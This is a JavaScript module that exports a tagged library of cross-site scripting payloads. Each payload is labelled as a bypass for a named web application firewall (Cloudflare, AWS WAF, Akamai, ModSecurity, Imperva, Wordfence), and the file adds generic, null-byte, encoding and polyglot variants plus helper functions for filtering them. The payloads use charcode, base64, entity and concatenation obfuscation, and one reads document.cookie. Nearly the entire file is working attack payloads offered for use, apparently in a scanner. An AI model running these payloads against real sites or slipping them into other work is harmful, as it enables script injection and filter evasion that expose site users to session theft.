/**
 * @file waf-bypass.js
 * @description WAF-specific bypass payloads
 * @version 8.0.0
 */

(function() {
    'use strict';

    const WAF_BYPASS_PAYLOADS = {
        // ═══════════════════════════════════════════════════════════════
        // 🛡️ Cloudflare Bypasses
        // ═══════════════════════════════════════════════════════════════
        cloudflare: [
            {
                id: 'cf_001',
                payload: '<svg/onload=alert(1)>',
                description: 'SVG onload without space',
                waf: 'cloudflare',
                severity: 'high',
                tags: ['cloudflare', 'svg', 'bypass']
            },
            {
                id: 'cf_002',
                payload: '<img src=x oNeRrOr=alert(1)>',
                description: 'Mixed case event handler',
                waf: 'cloudflare',
                severity: 'high',
                tags: ['cloudflare', 'case', 'bypass']
            },
            {
                id: 'cf_003',
                payload: '<iframe/src="javascript:alert(1)">',
                description: 'Iframe with forward slash',
                waf: 'cloudflare',
                severity: 'high',
                tags: ['cloudflare', 'iframe', 'bypass']
            },
            {
                id: 'cf_004',
                payload: '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
                description: 'CharCode obfuscation',
                waf: 'cloudflare',
                severity: 'high',
                tags: ['cloudflare', 'charcode', 'obfuscation']
            },
            {
                id: 'cf_005',
                payload: '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">',
                description: 'HTML entity encoding',
                waf: 'cloudflare',
                severity: 'high',
                tags: ['cloudflare', 'entity', 'encoding']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🔐 AWS WAF Bypasses
        // ═══════════════════════════════════════════════════════════════
        awsWAF: [
            {
                id: 'aws_001',
                payload: '<script>alert`1`</script>',
                description: 'Template literal alert',
                waf: 'aws-waf',
                severity: 'high',
                tags: ['aws', 'template', 'bypass']
            },
            {
                id: 'aws_002',
                payload: '<img src=x onerror=alert&#40;1&#41;>',
                description: 'Parentheses HTML encoding',
                waf: 'aws-waf',
                severity: 'high',
                tags: ['aws', 'entity', 'bypass']
            },
            {
                id: 'aws_003',
                payload: '<svg><script>alert(1)</script></svg>',
                description: 'Script inside SVG',
                waf: 'aws-waf',
                severity: 'high',
                tags: ['aws', 'svg', 'nested']
            },
            {
                id: 'aws_004',
                payload: '<img src=x onerror=\u0061lert(1)>',
                description: 'Unicode escape in handler',
                waf: 'aws-waf',
                severity: 'high',
                tags: ['aws', 'unicode', 'bypass']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🏢 Akamai Bypasses
        // ═══════════════════════════════════════════════════════════════
        akamai: [
            {
                id: 'ak_001',
                payload: '<img src=x onerror=window[`al`+`ert`](1)>',
                description: 'String concatenation in brackets',
                waf: 'akamai',
                severity: 'high',
                tags: ['akamai', 'concat', 'bypass']
            },
            {
                id: 'ak_002',
                payload: '<svg onload=eval(atob("YWxlcnQoMSk="))>',
                description: 'Base64 with eval',
                waf: 'akamai',
                severity: 'high',
                tags: ['akamai', 'base64', 'eval']
            },
            {
                id: 'ak_003',
                payload: '<img src=x onerror=alert(document["cookie"])>',
                description: 'Bracket notation property access',
                waf: 'akamai',
                severity: 'high',
                tags: ['akamai', 'bracket', 'bypass']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🔒 ModSecurity Bypasses
        // ═══════════════════════════════════════════════════════════════
        modsecurity: [
            {
                id: 'mod_001',
                payload: '<script>/**/alert(1)</script>',
                description: 'Comment insertion',
                waf: 'modsecurity',
                severity: 'high',
                tags: ['modsecurity', 'comment', 'bypass']
            },
            {
                id: 'mod_002',
                payload: '<img src=x onerror=alert(1);>',
                description: 'Semicolon terminator',
                waf: 'modsecurity',
                severity: 'high',
                tags: ['modsecurity', 'semicolon', 'bypass']
            },
            {
                id: 'mod_003',
                payload: '<img src=x onerror=\talert(1)>',
                description: 'Tab character whitespace',
                waf: 'modsecurity',
                severity: 'high',
                tags: ['modsecurity', 'whitespace', 'bypass']
            },
            {
                id: 'mod_004',
                payload: '<img src=x onerror=alert(1)/**/>',
                description: 'Trailing comment',
                waf: 'modsecurity',
                severity: 'high',
                tags: ['modsecurity', 'comment', 'bypass']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🛡️ Imperva Bypasses
        // ═══════════════════════════════════════════════════════════════
        imperva: [
            {
                id: 'imp_001',
                payload: '<img src=x onerror=prompt(1)>',
                description: 'Prompt instead of alert',
                waf: 'imperva',
                severity: 'high',
                tags: ['imperva', 'prompt', 'bypass']
            },
            {
                id: 'imp_002',
                payload: '<svg><script>&#97;lert(1)</script></svg>',
                description: 'SVG with partial entity encoding',
                waf: 'imperva',
                severity: 'high',
                tags: ['imperva', 'svg', 'entity']
            },
            {
                id: 'imp_003',
                payload: '<img src=x onerror=self[`ale`+`rt`](1)>',
                description: 'Self reference with concatenation',
                waf: 'imperva',
                severity: 'high',
                tags: ['imperva', 'self', 'concat']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🔐 Wordfence Bypasses (WordPress)
        // ═══════════════════════════════════════════════════════════════
        wordfence: [
            {
                id: 'wf_001',
                payload: '<img src=x onerror=confirm(1)>',
                description: 'Confirm instead of alert',
                waf: 'wordfence',
                severity: 'high',
                tags: ['wordfence', 'confirm', 'bypass']
            },
            {
                id: 'wf_002',
                payload: '<!--><img src=x onerror=alert(1)>-->',
                description: 'HTML comment wrapper',
                waf: 'wordfence',
                severity: 'high',
                tags: ['wordfence', 'comment', 'bypass']
            },
            {
                id: 'wf_003',
                payload: '<svg onload="alert(1)">',
                description: 'Quoted SVG onload',
                waf: 'wordfence',
                severity: 'high',
                tags: ['wordfence', 'svg', 'quoted']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🌐 Generic WAF Bypasses
        // ═══════════════════════════════════════════════════════════════
        generic: [
            {
                id: 'gen_001',
                payload: '<img src=x onerror=window["al"+"ert"](1)>',
                description: 'Window property concatenation',
                waf: 'generic',
                severity: 'high',
                tags: ['generic', 'window', 'concat']
            },
            {
                id: 'gen_002',
                payload: '<img src=x onerror=top["al"+"ert"](1)>',
                description: 'Top property concatenation',
                waf: 'generic',
                severity: 'high',
                tags: ['generic', 'top', 'concat']
            },
            {
                id: 'gen_003',
                payload: '<img src=x onerror=parent["al"+"ert"](1)>',
                description: 'Parent property concatenation',
                waf: 'generic',
                severity: 'high',
                tags: ['generic', 'parent', 'concat']
            },
            {
                id: 'gen_004',
                payload: '<img src=x onerror=(alert)(1)>',
                description: 'Parentheses wrapping',
                waf: 'generic',
                severity: 'high',
                tags: ['generic', 'parentheses', 'bypass']
            },
            {
                id: 'gen_005',
                payload: '<img src=x onerror=[alert][0](1)>',
                description: 'Array indexing',
                waf: 'generic',
                severity: 'high',
                tags: ['generic', 'array', 'bypass']
            },
            {
                id: 'gen_006',
                payload: '<img src=x onerror=alert?.call(null,1)>',
                description: 'Optional chaining call',
                waf: 'generic',
                severity: 'high',
                tags: ['generic', 'optional-chaining', 'bypass']
            },
            {
                id: 'gen_007',
                payload: '<img src=x onerror=Function("ale"+"rt(1)")()>',
                description: 'Function constructor',
                waf: 'generic',
                severity: 'high',
                tags: ['generic', 'function', 'constructor']
            },
            {
                id: 'gen_008',
                payload: '<img src=x onerror=this[String.fromCharCode(97,108,101,114,116)](1)>',
                description: 'This with fromCharCode',
                waf: 'generic',
                severity: 'high',
                tags: ['generic', 'this', 'charcode']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🎯 Null Byte Bypasses
        // ═══════════════════════════════════════════════════════════════
        nullByte: [
            {
                id: 'null_001',
                payload: '<script>alert(1)</script>\x00',
                description: 'Null byte suffix',
                waf: 'generic',
                severity: 'high',
                tags: ['null-byte', 'suffix', 'bypass']
            },
            {
                id: 'null_002',
                payload: '<img src=x\x00 onerror=alert(1)>',
                description: 'Null byte in attribute',
                waf: 'generic',
                severity: 'high',
                tags: ['null-byte', 'attribute', 'bypass']
            },
            {
                id: 'null_003',
                payload: '<script\x00>alert(1)</script>',
                description: 'Null byte in tag name',
                waf: 'generic',
                severity: 'high',
                tags: ['null-byte', 'tag', 'bypass']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🔤 Character Encoding Bypasses
        // ═══════════════════════════════════════════════════════════════
        encoding: [
            {
                id: 'enc_001',
                payload: '%3Cscript%3Ealert(1)%3C/script%3E',
                description: 'URL encoded script tags',
                waf: 'generic',
                severity: 'high',
                tags: ['encoding', 'url', 'bypass']
            },
            {
                id: 'enc_002',
                payload: '%253Cscript%253Ealert(1)%253C/script%253E',
                description: 'Double URL encoding',
                waf: 'generic',
                severity: 'high',
                tags: ['encoding', 'double-url', 'bypass']
            },
            {
                id: 'enc_003',
                payload: '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>',
                description: 'Full decimal entity encoding',
                waf: 'generic',
                severity: 'high',
                tags: ['encoding', 'decimal', 'entity']
            },
            {
                id: 'enc_004',
                payload: '<IMG SRC=&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>',
                description: 'Full hex entity encoding',
                waf: 'generic',
                severity: 'high',
                tags: ['encoding', 'hex', 'entity']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🎭 Polyglot Bypasses
        // ═══════════════════════════════════════════════════════════════
        polyglot: [
            {
                id: 'poly_001',
                payload: 'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
                description: 'Universal polyglot XSS',
                waf: 'generic',
                severity: 'critical',
                tags: ['polyglot', 'universal', 'bypass']
            },
            {
                id: 'poly_002',
                payload: '\'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)>',
                description: 'Context-breaking polyglot',
                waf: 'generic',
                severity: 'critical',
                tags: ['polyglot', 'context-break', 'bypass']
            }
        ]
    };

    // ═══════════════════════════════════════════════════════════════════
    // 🎯 Helper Functions
    // ═══════════════════════════════════════════════════════════════════
    function getAllPayloads() {
        const all = [];
        for (const category in WAF_BYPASS_PAYLOADS) {
            all.push(...WAF_BYPASS_PAYLOADS[category]);
        }
        return all;
    }

    function getPayloadsByWAF(waf) {
        return getAllPayloads().filter(p => p.waf === waf);
    }

    function getPayloadsByTag(tag) {
        return getAllPayloads().filter(p => p.tags.includes(tag));
    }

    // ═══════════════════════════════════════════════════════════════════
    // 🚀 Export
    // ═══════════════════════════════════════════════════════════════════
    exports.WAF_BYPASS_PAYLOADS = WAF_BYPASS_PAYLOADS;
    exports.getPayloads = getAllPayloads;
    exports.getPayloadsByWAF = getPayloadsByWAF;
    exports.getPayloadsByTag = getPayloadsByTag;
})();